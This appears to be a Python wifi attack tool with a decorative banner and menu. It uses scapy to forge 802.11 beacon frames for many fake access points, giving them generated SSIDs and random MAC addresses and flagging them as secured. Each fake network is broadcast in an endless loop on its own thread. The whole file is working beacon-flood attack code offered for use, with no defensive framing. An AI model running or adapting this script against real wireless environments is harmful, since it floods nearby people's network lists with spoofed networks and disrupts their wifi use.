from colorama import Fore
import time 
import os
from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp
from faker import Faker
from threading import Thread

def smenu(title, items):
    print(f"{Fore.GREEN}╔══════┅┅ {Fore.LIGHTGREEN_EX}{title}")
    for i in range(len(items)):
        print(f"{Fore.GREEN}║")
        print(f"{Fore.GREEN}╠═▸ {i}. {Fore.RESET}{items[i]}")
    print(f"{Fore.GREEN}║\n╚═┅┅{Fore.RESET}")
    krisjf = input(f"\n{Fore.LIGHTGREEN_EX}[{Fore.RESET}🐉{Fore.LIGHTGREEN_EX}] Option > {Fore.RESET}")
    return str(krisjf)
def cls():
    os.system("cls" if os.name == "nt" else "clear")
    
def vsetup():
    def oscomp():
        if os.name == "nt":
            cls()
            print(f"{Fore.RED}THIS ONLY WORKS ON LINUX SYSTEMS!{Fore.RESET}")
            exit()
    def yos_made():
        print(f"""{Fore.LIGHTGREEN_EX}
----- MADE WITH LOVE BY YOS {Fore.RED}<3{Fore.LIGHTGREEN_EX} -----{Fore.RESET}
""")
    cls()
    yos_made()
    time.sleep(2)
    cls()

def vbanner():
    print(f"""{Fore.LIGHTGREEN_EX}
 ██▒   █▓ ▒█████   ██▓  ▄▄▄█████▓ ██▓ █    ██  ███▄ ▄███▓
▓██░   █▒▒██▒  ██▒▓██▒  ▓  ██▒ ▓▒▓██▒ ██  ▓██▒▓██▒▀█▀ ██▒
 ▓██  █▒░▒██░  ██▒▒██░  ▒ ▓██░ ▒░▒██▒▓██  ▒██░▓██    ▓██░
  ▒██ █░░▒██   ██░▒██░  ░ ▓██▓ ░ ░██░▓▓█  ░██░▒██    ▒██ 
   ▒▀█░  ░ ████▓▒░░██████▒▒██▒ ░ ░██░▒▒█████▓ ▒██▒   ░██▒
   ░ ▐░  ░ ▒░▒░▒░ ░ ▒░▓  ░▒ ░░   ░▓  ░▒▓▒ ▒ ▒ ░ ▒░   ░  ░
   ░ ░░    ░ ▒ ▒░ ░ ░ ▒  ░  ░     ▒ ░░░▒░ ░ ░ ░  ░      ░
     ░░  ░ ░ ░ ▒    ░ ░   ░       ▒ ░ ░░░ ░ ░ ░      ░   
      ░      ░ ░      ░  ░        ░     ░            ░   
     ░                                                   {Fore.RESET}
""")

def send_beacon(ssid, mac, ifacem, refrate, infinite=True):
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
    # ESS+privacy to appear as secured on some devices
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    frame = RadioTap()/dot11/beacon/essid
    sendp(frame, inter=refrate, loop=1, iface=ifacem, verbose=0)

# faker.name()
def spamwifis(n_ap, iface, spmname, refrate):
    faker = Faker()
    ssids_macs = [
        (
        f"{spmname}{i}",
        faker.mac_address()
        ) for i in range(int(n_ap)) ]

    for ssid, mac in ssids_macs:
        Thread(target=send_beacon, args=(ssid, mac, iface, refrate)).start()
